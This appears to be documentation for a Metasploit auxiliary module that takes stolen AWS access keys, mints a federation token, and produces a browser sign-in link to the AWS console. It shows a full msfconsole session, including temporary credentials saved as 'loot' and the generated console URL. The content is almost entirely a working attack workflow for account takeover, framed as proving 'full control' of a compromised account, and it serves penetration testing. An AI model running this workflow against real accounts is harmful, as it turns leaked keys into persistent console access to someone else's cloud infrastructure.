#aws_console

Because sometimes we just need to show others that we have full control of an AWS account.

```
msf post(aws_create_iam_user) > use auxiliary/gather/aws_console
msf auxiliary(aws_console) > set ACCESS_KEY AKIA...
ACCESS_KEY => AKIA...
msf auxiliary(aws_console) > set SECRET abc...
SECRET => abc...
msf auxiliary(aws_console) > run

[*] Generating fed token
[*] sts.amazonaws.com:443 - Connecting (sts.amazonaws.com)...
[!] FederatedUser: {"Arn"=>"arn:aws:sts::097986286576:federated-user/Metasploit", "FederatedUserId"=>"097986286576:Metasploit"}
[!] Credentials: {"AccessKeyId"=>"ASIA...", "SecretAccessKey"=>"...", "SessionToken"=>"...", "Expiration"=>"2016-11-22T11:29:44Z"}
[!] PackedPolicySize: 4
[+] Generated temp API keys stored at: /home/pwner/.msf4/loot/20161121232854_default_54.1.2.3_AKIA_833089.txt
[+] Paste this into your browser: https://signin.aws.amazon.com/federation?Action=login&SigninToken=SIGNINTOKENIssuer=Metasploit&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F
[*] Auxiliary module execution completed
```